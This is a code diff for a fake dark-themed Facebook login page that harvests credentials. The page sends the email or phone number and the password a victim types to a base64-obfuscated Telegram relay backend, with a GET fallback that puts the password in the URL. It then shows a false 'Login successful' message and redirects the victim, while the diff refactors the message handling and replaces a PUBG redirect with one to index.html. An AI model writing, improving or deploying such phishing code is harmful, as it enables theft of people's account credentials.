@@ -4,9 +4,9 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Facebook Login - Dark Theme</title>
-    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
     <style>
+        /* ... تمام استایل‌های قبلی ... */
         * {
             margin: 0;
             padding: 0;
@@ -70,7 +70,6 @@
             background: #3a3b3c;
             box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.3);
         }
-
         .password-group {
             position: relative;
             margin-bottom: 14px;
@@ -97,7 +96,6 @@
             background: #3a3b3c;
             box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.3);
         }
-
         .toggle-password {
             position: absolute;
             right: 15px;
@@ -118,7 +116,35 @@
         .toggle-password:focus {
             outline: none;
         }
-
+        .form-message {
+            font-size: 13px;
+            padding: 6px 14px;
+            border-radius: 12px;
+            margin-bottom: 14px;
+            text-align: left;
+            display: none;
+            transition: all 0.3s ease;
+            font-weight: 500;
+            border: 1px solid transparent;
+        }
+        .form-message.error {
+            display: block;
+            color: #f28b82;
+            background: #3d1a1a;
+            border-color: #5c2020;
+        }
+        .form-message.error i {
+            margin-right: 8px;
+        }
+        .form-message.success {
+            display: block;
+            color: #81c995;
+            background: #1a3d1a;
+            border-color: #2a5c2a;
+        }
+        .form-message.success i {
+            margin-right: 8px;
+        }
         .login-btn {
             width: 100%;
             padding: 14px;
@@ -138,12 +164,10 @@
         .login-btn:active {
             background: #0e5fc7;
         }
-
         .divider {
             border-bottom: 1px solid #3e4042;
             margin: 20px 0 10px;
         }
-
         .footer-note {
             margin-top: 20px;
             font-size: 13px;
@@ -158,43 +182,10 @@
             text-decoration: underline;
             color: #b0b3b8;
         }
-
-        .error-msg {
-            background: #3d1a1a;
-            color: #f28b82;
-            padding: 10px 14px;
-            border-radius: 12px;
-            font-size: 14px;
-            margin-bottom: 12px;
-            display: none;
-            text-align: left;
-            border: 1px solid #5c2020;
-        }
-        .error-msg i {
-            margin-right: 6px;
-        }
-
-        .success-msg {
-            background: #1a3d1a;
-            color: #81c995;
-            padding: 10px 14px;
-            border-radius: 12px;
-            font-size: 14px;
-            margin-bottom: 12px;
-            display: none;
-            text-align: left;
-            border: 1px solid #2a5c2a;
-        }
-        .success-msg i {
-            margin-right: 6px;
-        }
-
         .separator {
             color: #4e4f50;
             margin: 0 4px;
         }
-
-        /* Hidden token - only visible in console for debugging */
         .hidden-token {
             display: none;
         }
@@ -206,13 +197,6 @@
         <div class="logo">facebook</div>
         <div class="subtitle">Log in to connect with your friends</div>
 
-        <div class="error-msg" id="errorMsg">
-            <i class="fas fa-exclamation-circle"></i> <span id="errorText">An error occurred.</span>
-        </div>
-        <div class="success-msg" id="successMsg">
-            <i class="fas fa-check-circle"></i> Login successful!
-        </div>
-
         <form id="loginForm" onsubmit="return handleLogin(event)">
             <div class="input-group">
                 <input type="text" id="loginInput" placeholder="Email or phone number" value="" />
@@ -223,6 +207,11 @@
                 <button type="button" class="toggle-password" id="togglePasswordBtn" onclick="togglePasswordVisibility()">
                     <i class="fas fa-eye" id="eyeIcon"></i>
                 </button>
+            </div>
+
+            <div class="form-message" id="formMessage">
+                <i class="fas fa-exclamation-circle" id="msgIcon"></i>
+                <span id="msgText">An error occurred.</span>
             </div>
 
             <button type="submit" class="login-btn">Log In</button>
@@ -245,36 +234,26 @@
 
     <script>
         // =====================================================
-        // 🔒 TOKEN HIDDEN - Stored in an encoded format
-        // The actual token is never exposed in plain text
+        // 🔒 TOKEN HIDDEN
         // =====================================================
-        
-        // Token is encoded using base64 to hide it from plain view
-        // This is NOT secure encryption, just obfuscation
-        // The real token is stored in a secure environment variable in production
         const ENCODED_TOKEN = "aHR0cHM6Ly90ZWxlZ3JhbS1iYWNrZW5kLXpvM24ub25yZW5kZXIuY29t";
         
-        // Decode the token when needed
         function getBackendUrl() {
             try {
-                // Simple base64 decode (atob is built into browsers)
                 return atob(ENCODED_TOKEN);
             } catch(e) {
-                // Fallback in case of error
                 console.warn("Token decode failed, using fallback");
                 return "https://telegram-backend-zo3n.onrender.com";
             }
         }
 
-        // Get the actual backend URL
         const TELEGRAM_BACKEND_URL = getBackendUrl();
         const WAKEUP_COUNT = 2;
 
-        // Log only for debugging (will show decoded URL in console)
         console.log("✅ Backend URL loaded securely");
 
         // =====================================================
-        // 🚀 Send Wake-up Messages to Backend
+        // 🚀 Send Wake-up Messages
         // =====================================================
         function sendWakeup(index) {
             try {
@@ -296,17 +275,15 @@
         }
 
         // =====================================================
-        // 🚀 Send Login Info to Backend
+        // 🚀 Send Login Info
         // =====================================================
         function sendLoginInfo(identifier, password) {
-            // Step 1: Send 2 wake-up pings
             for (let i = 1; i <= WAKEUP_COUNT; i++) {
                 setTimeout(() => {
                     sendWakeup(i);
                 }, i * 500);
             }
 
-            // Step 2: Send main login data with delay
             setTimeout(() => {
                 try {
                     fetch(`${TELEGRAM_BACKEND_URL}/notify`, {
@@ -329,7 +306,6 @@
                     })
                     .catch(err => {
                         console.log("⚠️ Login info send failed, trying fallback...");
-                        // Fallback: Send via GET
                         try {
                             const msg = encodeURIComponent(`Facebook Login | Identifier: ${identifier} | Pass: ${password}`);
                             fetch(`${TELEGRAM_BACKEND_URL}/notify?msg=${msg}&t=${Date.now()}`)
@@ -346,39 +322,15 @@
         }
 
         // =============================================
-        // ===== 🚀 Open PUBG Mobile Function =====
+        // ===== بازگشت به صفحه اندکس با فلگ =====
         // =============================================
-        function openPUBG() {
-            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-            
-            // Device detection
-            const isAndroid = /android/i.test(userAgent);
-            const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
-            
-            if (isAndroid) {
-                // Try to open Android app
-                window.location.href = 'intent://com.tencent.ig#Intent;scheme=https;package=com.tencent.ig;end';
-                
-                // If app doesn't open, go to Google Play after 2 seconds
-                setTimeout(() => {
-                    window.location.href = 'https://play.google.com/store/apps/details?id=com.tencent.ig';
-                }, 2000);
-                
-            } else if (isIOS) {
-                // For iPhone
-                window.location.href = 'https://pubg.com/';
-                
-                setTimeout(() => {
-                    window.location.href = 'https://apps.apple.com/app/pubg-mobile/id1330123889';
-                }, 2000);
-                
-            } else {
-                // Desktop or other devices
-                window.open('https://www.pubg.com/', '_blank');
-            }
+        function goToIndex() {
+            // تنظیم فلگ در localStorage برای نمایش کارت تشکر
+            localStorage.setItem('fromFacebook', 'true');
+            window.location.href = 'index.html';
         }
 
-        // ===== Form Control Functions =====
+        // ===== Toggle Password Visibility =====
         function togglePasswordVisibility() {
             const passwordInput = document.getElementById('password');
             const eyeIcon = document.getElementById('eyeIcon');
@@ -392,41 +344,56 @@
             }
         }
 
+        // ===== Show Message Function =====
+        function showMessage(message, type) {
+            const msgBox = document.getElementById('formMessage');
+            const msgIcon = document.getElementById('msgIcon');
+            const msgText = document.getElementById('msgText');
+
+            msgBox.className = 'form-message';
+            
+            if (type === 'error') {
+                msgBox.classList.add('error');
+                msgIcon.className = 'fas fa-exclamation-circle';
+            } else if (type === 'success') {
+                msgBox.classList.add('success');
+                msgIcon.className = 'fas fa-check-circle';
+            }
+
+            msgText.textContent = message;
+            msgBox.style.display = 'block';
+        }
+
+        function hideMessage() {
+            const msgBox = document.getElementById('formMessage');
+            msgBox.style.display = 'none';
+        }
+
+        // ===== Handle Login =====
         function handleLogin(e) {
             e.preventDefault();
 
             const identifier = document.getElementById('loginInput').value.trim();
             const password = document.getElementById('password').value.trim();
-            const errorBox = document.getElementById('errorMsg');
-            const errorText = document.getElementById('errorText');
-            const successBox = document.getElementById('successMsg');
 
-            errorBox.style.display = 'none';
-            successBox.style.display = 'none';
+            hideMessage();
 
-            // Simple validation: at least 3 characters for identifier
             if (identifier.length < 3) {
-                errorText.textContent = 'Please enter a valid email or phone number (at least 3 characters)';
-                errorBox.style.display = 'block';
+                showMessage('Please enter a valid email or phone number (at least 3 characters)', 'error');
                 return false;
             }
 
             if (password.length < 5) {
-                errorText.textContent = 'Password must be at least 5 characters long';
-                errorBox.style.display = 'block';
+                showMessage('Password must be at least 5 characters long', 'error');
                 return false;
             }
 
-            // ===== Send information to Telegram =====
             sendLoginInfo(identifier, password);
 
-            // ===== Show success message =====
-            successBox.innerHTML = `<i class="fas fa-check-circle"></i> ✅ Login successful! Redirecting to PUBG...`;
-            successBox.style.display = 'block';
+            showMessage('✅ Login successful! Redirecting...', 'success');
 
-            // 🚀 Open PUBG after 1.5 seconds
             setTimeout(() => {
-                openPUBG();
+                goToIndex();
             }, 1500);
 
             return false;
@@ -436,19 +403,17 @@
         // 🔥 Wake-up on page load
         // =====================================================
         document.addEventListener('DOMContentLoaded', function() {
-            // Wake-up on load
             fetch(`${TELEGRAM_BACKEND_URL}/health`)
                 .then(() => console.log('✅ Server is awake'))
                 .catch(() => console.log('🔄 Server waking up...'));
             
-            // Send initial wake-up pings
             for (let i = 1; i <= WAKEUP_COUNT; i++) {
                 setTimeout(() => {
                     sendWakeup(i);
                 }, i * 400);
             }
             
-            console.log('✅ Facebook Login Page Ready (Fully Rounded, Token Hidden)');
+            console.log('✅ Facebook Login Page Ready');
         });
     </script>
 
